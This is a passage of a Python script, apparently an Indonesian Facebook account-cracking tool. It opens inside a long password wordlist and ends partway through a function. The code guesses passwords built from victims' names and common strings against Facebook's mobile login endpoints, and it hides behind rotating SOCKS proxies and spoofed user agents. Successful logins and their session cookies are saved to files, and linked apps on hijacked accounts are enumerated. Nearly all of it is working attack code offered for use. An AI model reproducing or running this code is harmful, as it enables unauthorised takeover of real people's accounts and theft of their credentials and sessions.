0','091210','300313','200103','080409','190520','121100','120200','260211','140607','241202','230520','191009','280319','130108','270308','300518','100710','200194','050399','100806','100420','130109','020320','220406','131092','101002','240318','300210','181205','160104','040507','260412','100319','210390','201095','040702','070501','260891','060106','130708','240408','010691','290119','221098','050615','230305','280702','200691','121121','240221','180119','120700','100600','030195','071020','270502','210613','070719','190219','180614','070298','070799','181114','020797','051109','191198','111221','140613','080704','210990','220398','300517','021118','151014','080395','271119','101190','190711','240209','170210','250320','091099','261211','300304','250215','040502','240901','031012','020621','160117','140501','200992','010502','101096','040897','051209','030418','231096','060103','051111','091090','290316','250500','240606','090600','060395','031106','031200','070696','140402','010895','210209','260414','131121','240415','060497','221120','221290','200399','170496','271197','040802','150692','091216','100418','061205','200898','100613','270313','141103','140922','250898','140522','230308','181113','071093','050105','140102','300811','190601','180392','120206','120692','010519','250807','171096','020409','051122','060806','250311','240609','110795','090100','041212','210393','280815','040301','100908','061109','230294','120715','050995','070993','300108','061209','110793','120811','090106','260419','230700','020199','181022','050508','141020','280409','270799','220918','240696','231103','251292','250103','270997','020716','040296','280596','290102','110899','231104','050606','071208','221200','031100','180313','180619','090819','220513','290406','210107','100295','210493','110121','010399','250900','240913','120822','190805','240792','230507','111200','020699','140200','130999','080715','080901','100597','240305','090698','150799','250706','051001','041196','190697','040609','140721','110521','270103','281010','160515','090507','211120','040211','100711','091011','231205','140298','280820','040694','290401','060807','190700','011192','280796','221113','190196','231115','061212','050522','270617','080322','011014','280616','090711','071295','010901','110200','190420','051205','221214','270912','230992','100511','300692','160895','170602','020903','051220','120621','021209','300307','281002','191197','201205','141220','020502','041013','180105','181291','160391','080700','020505','230522','270318','301211','200722','140308','180799','160517','281197','230894','010907','080200','250692','040720','110112','300707','240495','021293','180106','230711','020197','190121','110893','071009','150918','151111','180591','171021','250208','200222','101111','091095','171010','171297','301111','250802','200303','230414','021211','191003','230297','210303','130493','090222','050721','250194','230291','240815','120600','060896','230622','140505','161118','151020','240799','250113','111292','170901','260113','260917','010109','020519','030401','190791','110907','151092','210819','130221','150722','140300','240312','200797','270992','080391','050200','221192','230892','220293','080908','071018','021219','160113','021204','060419','250520','070208','240299','250519','170290','161115','190502','010704','191016','120700','270604','211098','171013','261017','030706','100792','030699','170914','260692','111101','280813','201220','270400','280290','091022','150117','290891','180910','010501','111002','260402','270304','070100','151115','100112','300295','081121','231298','011007','211204','060999','280395','191013','031015','050607','120993','210713','150798','301210','250207','021195','050294','110300','060913','270408','030993','130417','200195','270491','170800','040196','301203','100715','030119','240909','200710','240722','120212','171192','221015','190810','280817','080997','190701','301092','290305','050897','280496','100894','030310','261097','300198','261107','280922','130922','100492','101297','010115','270995','010406','230192','150700','051097','261216','250511','020314','260800','190103','010721','290194','250513','250109','251195','011199','050106','161015','150890','150792','020215','030500','160122','050418','241196','210315','151113','180615','071098','090914','270399','081199','241218','211202','270710','041290','090613','300697','051104','280599','051295','291011','240809','050813','010622','281091','170410','161100','090394','020112','090814','240391','060114','271196','161008','250694','120515','161022','070191','220798','150192','270203','180790','190492','160602','050114','090302','131009','270505','060510','010512','090994','250110','060305','051291','061216','040700','210714','290202','031199','290312','160699','030617','231200','161195','030903','130691','130701','171109','131219','080106','270499','191007','070817','290701','240206','030216','170313','120105','171020','150294','060598','200914','010299','080800','300900','100608','231010','290904','041209','281018','171095','121209','091020','121197','030406','071013','130516','010591','110798','200299','210612','130395','220900','070608','130217','180406','071090','030712','181120','050514','261293','100615','040112','051003','050102','291095','281093','140803','150612','180620','270201','010505','070720','160817','200408','060218','200720','281220','100722','200200','240708','011295','120490','260808','300409','270699','060221','171092','010912','110412','180814','140604','030613','160800','120410','130518','301019','090602','170912','100297','070603','120415','010707','260894','180190','300117','060715','151104','301015','171001','271219','140700','170100','190299','080213','140920','130719','080719','270120','260405','251093','040711','120905','210510','220693','180700','010313','020201','171220','151122','110102','160794','290713','030190','180707','281221','100713','180293','150308','040717','140116','161002','230596','040315','140507','210318','221194','260216','280498','220814','230610','150421','150491','301022','060496','010604','121219','060710','050801','240921','230310','070511','210796','090614','280190','150895','240291','200293','091205','260807','041111','241192','091292','210195','051120','020418','270492','220218','120317','190119','260390','030902','130304','080495','140892','211114','141293','160509','261196','011201','100219','270917','180401','131296','131193','020512','090221','260494','040101','230717','010712','190898','161193','140800','300613','230416','180896','161207','100403','021093','120794','130700','200909','240591','090297','250414','140916','011290','110296','160813','110198','070705','190712','081117','130116','041220','220800','200699','161006','100507','270414','030721','291199','121201','020297','210394','070297','030820','220501','271202','100393','150213','290911','100618','150510','220610','270215','110409','120520','170208','290990','240498','080490','290895','161196','040400','250195','130716','230496','220697','210808','060622','120516','160596','090392','270719','300114','170508','160810','070115','291004','020713','070612','040418','120118','141193','190312','291211','040210','201114','050307','100217','080693','131192','020896','170902','191100','030609','050517','080416','030297','120405','110497','040819','160190','250995','060200','300919','120310','241222','130194','150190','291012','050295','290206','260717','131000','200499','021122','151202','281092','050913','261292','030701','241213','080909','210900','190296','300196','240394','300119','150608','070311','190602','170793','251215','210495','180820','300111','080519','051014','200802','080899','041019','131011','271103','101101','211105','130706','220806','111113','120913','280896','050296','050991','250905','110905','201107','090904','050717','130913','141015','090399','180412','180491','300597','291017','250709','170504','300208','190821','071206','121292','060815','130310','090605','300812','240891','051117','071199','230709','170993','190194','050822','280704','270216','020814','050395','280698','220692','230411','050310','280312','161094','060590','011220','170222','151212','140790','241000','011198','100595','220807','071212','080792','220818','131194','111206','121115','240918','140718','190422','080893','020800','120805','200604','130208','230519','301291','170495','201004','251192','090720','180720','031210','090693','121291','220401','201292','070416','150514','200405','010894','211117','150400','080891','160221','060317','100607','261207','070408','130190','131093','110400','060819','180490','100691','050694','120510','120722','101298','080694','030793','300205','130797','090304','011009','190808','040705','300291','150310','280816','230405','211102','081099','200613','150894','030994','020603','080612','070801','120295','030896','090500','260904','010795','220305','010812','250400','110116','290920','031105','131096','280690','110495','110107','070222','160819','150195','290411','140495','010418','300222','141100','270721','181121','130920','291215','010207','040900','290199','090220','271002','070104','271000','050402','290609','040190','060612','050518','120908','060197','250500','070112','061018','120900','170507','200801','080206','210301','030892','160692','120104','220404','290790','230193','301009','230603','250292','070122','110294','060521','290803','021102','051294','230806','140817','220197','131108','130998','150502','100296','190499','120691','301121','071293','300892','130509','241114','210115','060605','220301','230890','040512','011210','231117','220109','280321','180998','030497','271192','180421','121298','150819','140900','191022','100499','130200','040515','251097','081116','241004','101105','250191','240116','130497','080902','061013','280390','010190','120920','090907','070819','031096','120500','180498','210491','160696','231099','030907','260511','210707','011219','300497','041293','190419','190690','031202','240311','120809','190721','230713','030891','070109','220822','220213','130814','110315','300218','211000','190122','220996','201007','281216','110916','271022','180298','221094','060714','250100','290207','260516','290696','020521','161295','240211','130508','090521','041105','120321','270714','110314','060407','140506','020610','300515','210918','270613','130895','300521','131116','231002','210991','171122','050893','280521','010914','020494','100602','241113','130813','190421','191103','030608','110697','110816','061200','200507','211022','010108','030292','130306','300309','220421','280717','211109','011096','260704','240903','170301','070197','050205','090800','261299','020499','200620','060299','191001','301216','170213','110212','010918','160595','111016','290105','130414','010294','270899','110820','010205','090397','200991','291101','110801','010302','281213','240105','130713','130897','250509','040102','170921','111100','251019','220915','270697','191200','170913','140798','290319','090390','040195','040495','260505','121290','140611','251193','280509','201207','141012','090317','161200','300322','291193','020114','190513','240598','191209','130301','021297','010513','220309','230816','041216','151099','181194','230721','031022','110612','250501','030214','081014','160694','140796','030419','300703','200108','270591','060417','160609','061102','230109','140601','290900','221018','071298','240699','210314','050820','170616','200317','120303','230508','051192','240597','270795','170106','300106','051020','170414','200105','060199','130908','170493','200504','230413','090796','050922','120217','191012','260903','190803','270219','200821','230209','280107','270512','250114','270592','290193','080994','170608','301190','121018','011108','110597','270516','300420','140108','120713','270998','040712','150420','100413','090406','121093','190515','020818','300416','020915','260910','250420','150403','221090','180496','130214','010291','290921','180117','120208','290600','241097','070597','060508','011010','040514','170810','290815','140104','260302','071197','200996','240922','121099','051094','190104','281020','260399','151208','021006','220200','140806','281016','160114','280700','231119','201298','240121','080417','060302','281205','240492','111105','290707','060309','240812','280804','101015','280206','020421','271095','291198','010319','070193','301096','120313','071019','210208','250711','031118','090199','220198','040509','151119','010191','090704','120694','150519','160422','020316','080400','011094','130596','141010','290800','260792','020212','200903','230719','010410','110317','150107','300700','101109','180417','080100','210592','150105','230790','160798','171117','060503','220101','050895','200892','131117','251002','300192','050396','290506','290190','271090','270815','080698','041018','140599','181212','040400','250313','280903','110416','160700','040212','180514','140710','010906','300610','210298','010402','151016','130419','200517','170893','070700','110617','230602','300191','130204','291116','120108','190110','140117','270718','110306','011013','261192','220209','100790','280200','261197','300716','060793','080797','231000','091002','250404','170701','261013','011104','140410','090692','170312','230690','040306','091114','300216','080116','110822','221013','180917','180811','190407','201215','050196','230817','141006','260906','130114','110600','151005','070796','110196','151214','140615','110904','190905','071106','200595','140812','120302','221095','240504','120914','181017','180691','050117','200919','220414','040414','010112','180599','010695','120420','081007','301212','141100','270518','251120','120407','210197','230409','071103','300408','030894','280703','170518','211222','041192','210891','280202','261108','240109','020403','281017','120991','030598','281121','090813','291217','170110','031115','220716','150506','211104','230511','271015','240421','081120','060709','051202','240916','260992','050100','051010','050621','100601','151009','020294','250190','200597','280196','111119','060596','300107','110106','121005','271004','020214','190906','240122','170400','050191','140512','050406','290916','060890','121207','270301','281100','241203','150691','260406','240594','290210','211112','220208','081093','250105','130398','150222','030614','080615','150505','100120','100812','180213','120396','071191','261206','251103','070313','020597','021193','031104','190812','060322','220220','041103','040916','140393','080707','061290','110494','250304','140291','180391','191195','251110','230991','300997','120806','301114','180919','080611','190699','300999','280603','230821','090514','080101','080215','180321','060509','070615','081198','161106','031292','140307','210899','140399','200695','230419','230704','160801','281292','281206','220912','261201','291118','280399','140610','050312','081100','300621','140310','180407','120203','140991','300109','201216','130795','191290','010506','090411','211213','240418','180604','080807','131007','060712','020697','130311','040698','200215','080120','090721','130919','200500','120892','291003','080321','020900','160321','270493','050818','050120','140809','050214','100320','160721','080415','190698','241021','240397','230798','080810','101021','281297','290617','260300','270393','030499','220710','210100','280417','290516','120419','030304','280491','110519','241092','300519','160791','280906','280517','290390','161109','150898','111194','190604','220899','240518','130312','090808','050915','120910','030100','040706','240419','260413','201100','221216','110914','070618','090415','300601','060813','140794','120702','021207','250391','160214','300400','160815','020213','130615','290605','190891','150903','140313','220703','280302','010605','270293','260421','090894','300694','181119','210696','170205','290508','241016','191018','190896','250416','301002','301005','291013','031205','210422','121012','270395','180916','180905','211203','120210','240493','081216','060700','270792','230103','290811','171100','210321','301000','300321','300916','050392','230319','130320','211016','060790','140990','230198','240715','180214','170894','090499','230205','071110','090620','201000','051115','111204','270407','150211','080300','100698','200394','110309','120120','220803','200420','080608','141022','210212','271217','070513','171207','201200','050600','080814','100919','130100','030404','210413','290122','160319','070619','190508','280514','030811','090609','301292','290500','160413','110505','270118','151215','140113','110420','220519','260312','220994','031122','281095','231007','100800','020300','021192','290490','140209','241115','220602','270311','231212','020606','251021','120617','231219','150507','200612','280503','190713','280920','090594','010794','130993','071091','020700','010415','280116','260194','260817','190302','120612','140998','110103','170909','230617','020990','021117','041096','070192','101194','030596','231114','140406','160512','271114','230322','300101','030315','210590','050193','300599','220505','170104','120395','100917','120705','050494','040793','010994','190894','090217','280218','210703','151196','120290','120198','301201','050591','151295','080196','190915','050811','110295','240510','180901','020600','121101','070890','071219','010612','041095','250591','091294','181104','120191','120319','100193','250921','210190','060113','120193','200807','090211','010899','070512','300400','220799','151211','150418','021190','090104','100810','021121','190710','170211','270999','120311','261117','100214','011095','010793','061292','241005','170896','141200','070218','021022','230599','100512','191214','221019','210408','240409','240118','020515','080808','270413','100212','010308','091219','060104','160218','070517','220708','260305','140214','050610','250300','250522','070391','061111','050795','101296','100404','181201','080805','020909','270717','210711','240102','110205','121210','030204','120112','111100','221102','131298','011018','270210','030602','121196','210516','080998','190819','210416','070509','280309','100992','160598','200109','170407','120720','280714','031002','020118','090417','130499','210293','161005','030918','250610','100204','231092','280406','030410','230815','271194','041112','251017','080500','020399','190405','041211','211292','170204','131010','160408','040402','040421','180215','291220','250497','150595','240811','150604','040291','210800','100995','121108','081195','190398','201005','030313','040396','181112','191202','150113','190696','151293','130898','170900','201098','250718','151112','190408','150693','240805','210607','220914','070614','190519','040594','170696','071117','280701','090597','100515','190306','090500','210119','190622','200590','250315','111118','030494','250296','021217','200217','191297','030202','020619','171116','210909','151205','211113','120511','180695','301200','230614','260110','170113','050808','200106','270114','130396','160905','170714','160293','260416','150900','021299','210193','150921','200412','190319','221093','290992','170916','190621','150406','240212','171119','080722','260911','060895','100510','230600','230900','300501','300498','160100','060607','011105','140902','101210','161296','140619','181094','290300','230904','100299','220510','200308','300512','301198','250703','290695','290909','051110','220890','211100','170702','140414','140905','020295','030990','260300','150494','100518','150801','170207','100916','030319','300615','080816','111098','040605','150402','110713','151001','280507','251114','300914','280199','090997','290398','110516','201014','250118','180897','140205','110991','160620','200216','250222','240213','211099','110122','130621','300712','100905','171194','281291','231090','250702','141115','041003','151220','251212','121007','240698','290212','200615','040118','130496','200808','060704','210794','161197','231006','130107','121100','190512','260100','130393','090821','060200','030207','090707','130818','070708','241197','080811','270814','161291','251198','070291','280405','200608','030394','170908','161194','160898','060792','200390','100603','091215','171199','260191','250805','280105','020210','060513','180311','180495','220596','211199','180605','070998','220315','201299','021108','241010','060499','141021','130291','190709','280895','091101','190794','250603','040298','250199','070303','131019','210415','031094','161091','220196','160606','120797','011292','240191','300404','080494','100419','260206','270504','301299','280209','251191','050309','101200','140202','260790','121097','011191','300722','021215','110503','260309','sayang','sayang12','sayang123','sayang1234','sayang321','sayang12345','sayang123456','123456','1234567','12345678','123456789','sayangku','sayang123','bismillah','bismillah1','bismillah12','bismillah123','bismillah1234','bismillah12345','bismillah123456','anjing','katasandi','sandi123','sandi1','sandi12','sandi1234','sandi12345','sandi123456']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:					
					pwv.append(frs+'1')
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'@123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'@12345')
					pwv.append(frs+'786')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'1')
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'@123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'@12345')
					pwv.append(frs+'786')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'touch' in method:
				pool.submit(cracktouch,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[cyan]>>[green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan] <<[white] '))
	print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
	print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
	print('')
	print('>> Lanjut Crack Kembali ( Y/t ) ? ')
	woi = input('>> Pilih : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t{x}>>{k} Good Bye Dadaahh{x} << ')
		time.sleep(2)
		exit()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r🎉 {P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{K}>> {idf}|{pw}{N}')     
				os.popen('play-audio .cp.mp3')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{H}>> {idf}|{pw}|{kuki}\n{ua}{N}')
				os.popen('play-audio .ok.mp3')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#------------------[ METHODE-MBASIC-2 ]-------------------#
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r🔥 {P}[{asu}Mbasic{P}]{P}[{b}{loop}{P}/{p}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{m}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{K}>> {idf}|{pw}{N}')     
				os.popen('play-audio .cp.mp3')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{H}>> {idf}|{pw}|{kuki}{N}')
				os.popen('play-audio .ok.mp3')
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#---------------------[ METHODE-TOUCH-3 ]---------------------#
def cracktouch(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	nip=random.choice(prox)
	proxs= {'http': 'socks5://'+nip}
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\r%s ☬ %s/%s ☬ OK:%s ☬ CP:%s ☬ %s%s%s ☬'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'touch.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://touch.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://touch.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'touch.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://touch.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://touch.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://touch.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				elif 'ya' in princp:
					print('\n')
					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='AOREC-XD CP'))
					open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='AOREC-XD OK'))
					ok+=1
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					infoakun += (f"\n[bold cyan][•] LIST ACTIVE APPLICATIONS :[/bold cyan] \n")
